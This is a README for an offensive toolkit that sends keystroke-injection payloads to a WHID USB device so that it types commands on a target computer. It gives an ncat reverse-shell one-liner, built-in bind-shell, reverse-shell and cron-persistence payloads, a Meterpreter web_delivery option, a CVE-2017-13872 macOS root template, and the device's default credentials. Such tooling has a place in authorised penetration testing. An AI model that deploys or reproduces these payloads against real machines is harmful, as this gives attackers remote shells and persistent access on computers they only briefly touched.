# WHID Injector Toolkit
What is it ? It's a simple script to send commands (french keyboard) from your terminal to the WHID Injector. It will automatically convert the "azerty" to "qwerty" format if you're lazy. Furthermore it has builtins payload such as reverse-shell and bind-shell.

![whid-picture](https://github.com/swisskyrepo/WHID_Toolkit/blob/master/screenshots/whid.jpg?raw=true)

**Warning** : Newest version of WHID Toolkit expect the WHID to have a firmware in the prefered language, alternatively you can force the french keyboard with the english firmware using the `--force` arguments. For more customization informations go to swisskyrepo.github.io .

Where to buy a WHID Injector ? I got mine from [Aliexpress](https://www.aliexpress.com/item/Cactus-Micro-compatible-board-plus-WIFI-chip-esp8266-for-atmega32u4/32318391529.html)

## How to start
 1. Connect to the Access Point with the SSID "**Exploit**" with a password of "**DotAgency**".   
 2. Open a web browser pointed to "**http://192.168.1.1**"   
    > The default administration username is "**admin**" and password "**hacktheplanet**".       

 3. Remember to upgrade the firmware you will find the latest version in this repository  

More info on the official Github : https://github.com/whid-injector/WHID


## How to use the script
```c
python3 WHIDInjector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt -h                 
usage: WHIDInjector.py [-h] [-v] [--host [HOST]] [--port [PORT]]
                       [--user [USER]] [--pass [PASS]] [--panel [PANEL]]
                       [--payload [PAYLOAD]]

optional arguments:
  -h, --help           show this help message and exit
  -v                   Verbosity of the output
  --host [HOST]        Host reverse-shell
  --port [PORT]        Port reverse-shell
  --user [USER]        Wifi Panel username
  --pass [PASS]        Wifi Panel password
  --panel [PANEL]      Wifi Panel password
  --payload [PAYLOAD]  Payload template
```

Targeting a Windows OS
```c
python3 WHIDInjector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt
```

Send a simple reverse-shell payload
```
$ python3 WHIDInjector.py -v --host 127.0.0.1 --port 4444
     -------------------------------------------------------------
      WHID injector - You need to be connected to the Exploit AP
     -------------------------------------------------------------
                   __   °
                 <(o )___
                  ( ._> /
                   `---'                      @pentest_swissky

Enter a payload, eg: bash -c 'nohup ncat 127.0.0.1 4242 -e $SHELL &'
-------------------------------------------------------------------
>>> reverse
Payload:
Rem:Default Payload
Press:130+195
CustomDelay:1000
Print:bqsh 6c 4nohup ncqt !@&<)<)<! $$$$ 6e ]SHELL 14
CustomDelay:1000
Press:176

Sending payload to http://192.168.1.1/runlivepayload
```

## Payloads and commands
| Commands       | Description                           |
| :------------- | :-------------                        |
| bind           | initiate a bind shell on results.port |
| reverse        | initiate a reverse shell on results.host and results.port |
| crontab        | set up a crontab reverse shell on results.host and results.port |
| meterpreter [https://YOUR_SERVER_IP:4646/posh-payload] | use exploit/multi/script/web_delivery with a posh-payload    |
| send some text | send the specified text              |
| h              | help                                 |
| q              | quit                                 |

You can change the options with `SET option_name option_value`
```c
>>> set host 192.168.1.12
>>> set port 4444
```

At the moment the following templates are available, feel free to add more:

| Template | Description |
| :------------- | :------------- |
| payloads/osx_high_sierra_root.txt | CVE-2017-13872 |
| payloads/osx.txt     | execute a command with [Cmd]+[Space] |
| payloads/windows.txt | execute a command with [Windows]+[R] |
| payloads/i3.txt      | execute a command with [Windows]+[Enter] |
| payloads/gnome.txt | execute a command with [Alt]+[F2] |
| payloads/default.txt | default behavior is the gnome command |

NOTE: The i3 payload uses the [Windows] key as the default modifier, some people prefer to use [CTRL]
